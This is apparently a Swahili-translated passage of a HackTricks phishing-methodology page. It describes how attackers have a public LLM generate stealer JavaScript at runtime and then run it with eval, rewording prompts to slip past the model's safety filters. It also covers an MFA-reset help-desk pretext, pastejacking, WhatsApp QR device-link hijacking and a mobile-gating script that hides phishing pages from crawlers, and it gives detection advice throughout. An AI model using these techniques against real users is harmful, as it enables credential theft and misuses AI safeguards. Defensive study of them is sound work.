Attackers wanaweza kusafirisha HTML inayoonekana salama na **kutengeneza stealer wakati wa runtime** kwa kuiomba **trusted LLM API** itoe JavaScript, kisha kui-execute ndani ya browser (kwa mfano, `eval` au dynamic `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings kwenye prompt; badilisha wording mara kwa mara ili kupita safety filters na kupunguza hallucinations.
2. **Client-side API call:** wakati wa load, JS huita public LLM (Gemini/DeepSeek/etc.) au CDN proxy; ni prompt/API call pekee iliyo kwenye static HTML.
3. **Assemble & exec:** unganisha response na kui-execute (polymorphic kwa kila visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** code iliyozalishwa hubinafsisha mtego (kwa mfano, uchanganuzi wa token ya LogoKit) na kutuma creds kwenye endpoint iliyofichwa kwenye prompt.

**Sifa za Evasion**
- Traffic hupitia domains za LLM zinazojulikana sana au proxies za CDN zinazoaminika; wakati mwingine kupitia WebSockets kwenda kwenye backend.
- Hakuna payload tuli; JavaScript hasidi huwepo tu baada ya render.
- Uzalishaji usio wa deterministic hutengeneza stealers **za kipekee** kwa kila session.

**Mawazo ya Detection**
- Endesha sandboxes zikiwa na JS imewezeshwa; weka alama kwenye **`eval` ya runtime/utengenezaji wa script unaobadilika unaotokana na majibu ya LLM**.
- Tafuta POST za upande wa mbele kwenda kwenye LLM APIs zinazofuatwa mara moja na `eval`/`Function` kwenye maandishi yaliyorejeshwa.
- Toa alert kuhusu domains za LLM ambazo hazijaidhinishwa kwenye client traffic pamoja na POST za credentials zinazofuata.

---

## Lahaja ya MFA Fatigue / Push Bombing – Uwekaji Upya wa Lazima
Mbali na push-bombing ya kawaida, waendeshaji hulazimisha tu **usajili mpya wa MFA** wakati wa simu ya help-desk, hivyo kubatilisha token iliyokuwepo ya mtumiaji. Ombi lolote la kuingia linalofuata huonekana kuwa halali kwa victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Fuatilia matukio ya AzureAD/AWS/Okta ambapo **`deleteMFA` + `addMFA`** hutokea **ndani ya dakika chache kutoka IP ileile**.



## Clipboard Hijacking / Pastejacking

Washambuliaji wanaweza kunakili kwa siri commands hasidi kwenye clipboard ya mwathiriwa kutoka kwenye ukurasa wa wavuti uliodukuliwa au wa typosquatting, kisha kumdanganya mtumiaji azibandike ndani ya **Win + R**, **Win + X** au dirisha la terminal, na hivyo kutekeleza code kiholela bila download au attachment yoyote.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Usambazaji wa Malicious App (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Hijack ya kuunganisha kifaa cha WhatsApp kupitia QR social engineering
* Ukurasa wa lure (kwa mfano, “channel” bandia ya wizara/CERT) huonyesha QR ya WhatsApp Web/Desktop na kumwelekeza mwathiriwa kuiscan, na hivyo kumuongeza mshambuliaji kwa siri kama **linked device**.<sup>[[12]](#references)</sup>
* Mshambuliaji hupata mara moja mwonekano wa chat/contact hadi session iondolewe. Baadaye waathiriwa wanaweza kuona notification ya “new device linked”; defenders wanaweza kutafuta matukio yasiyotarajiwa ya device-link muda mfupi baada ya kutembelea QR pages zisizoaminika.

### Mobile-gated phishing ili kukwepa crawlers/sandboxes
Waendeshaji wanazidi kuweka phishing flows zao nyuma ya device check rahisi ili desktop crawlers zisifike kwenye pages za mwisho. Muundo wa kawaida ni script ndogo inayokagua DOM yenye uwezo wa touch na kutuma matokeo kwenye server endpoint; clients zisizo za mobile hupokea HTTP 500 (au blank page), huku watumiaji wa mobile wakipewa flow kamili.<sup>[[7]](#references)</sup>

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
Mantiki ya `detect_device.js` (imerahisishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia ya server inayozingatiwa mara nyingi:
- Hu-set session cookie wakati wa load ya kwanza.
- Hukubali `POST /detect {"is_mobile":true|false}`.
- Hurejesha 500 (au placeholder) kwa GET zinazofuata wakati `is_mobile=false`; hutoa phishing ikiwa tu `true`.

Heuristics za hunting na detection:
- Query ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: mfuatano wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non-mobile; njia halali za victim wa mobile hurejesha 200 pamoja na HTML/JS inayofuata.
- Zuia au chunguza kwa makini kurasa zinazoweka maudhui kulingana pekee na `ontouchstart` au device checks zinazofanana.

Vidokezo vya defence:
- Endesha crawlers zikiwa na fingerprints zinazofanana na mobile na JS ikiwa imewezeshwa ili kufichua maudhui yaliyofichwa.
- Weka alert kwa majibu ya 500 yanayotiliwa shaka yanayofuata `POST /detect` kwenye domains zilizosajiliwa hivi karibuni.

## References

- [1] [Kutengeneza Domain Variations Zinazotumika katika Phishing (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Kutafuta Phishing: Tools and Techniques (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Kuiba Credentials na Bypass 2FA kwa Kutumia noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Robando sesiones y bypasseando 2FA con EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Jinsi ya Kusakinisha na Kusanidi DKIM na Postfix kwenye Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Ripoti ya Global Incident Response ya Unit 42 ya 2025 – Toleo la Social Engineering](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infra na heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Frontier Inayofuata ya Runtime Assembly Attacks: Kutumia LLMs Kuzalisha Phishing JavaScript kwa Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation, Click Hijacking, na TDS: Ndani ya Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Kuhijack traffic ya Microsoft windows.com kwa bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually: Fake dating app iliyotumiwa kama lure katika targeted spyware campaign nchini Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs na samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
